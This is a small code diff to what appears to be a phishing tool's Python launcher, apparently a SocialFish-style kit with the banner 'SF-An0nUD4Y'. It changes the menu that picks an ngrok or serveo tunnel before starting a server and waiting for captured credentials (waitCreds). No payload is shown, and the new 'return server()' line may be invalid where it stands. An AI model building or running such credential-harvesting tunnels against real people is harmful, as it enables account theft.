@@ -330,8 +330,10 @@ if __name__ == "__main__":
                 choice = input(" \n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
                 if choice == '1':
                 	runNgrok()
+                elif choice == '2':
+                    serveo()
                 else:
-                	serveo()
+                	return server()
         server()
         multiprocessing.Process(target=runServer).start()
         waitCreds()
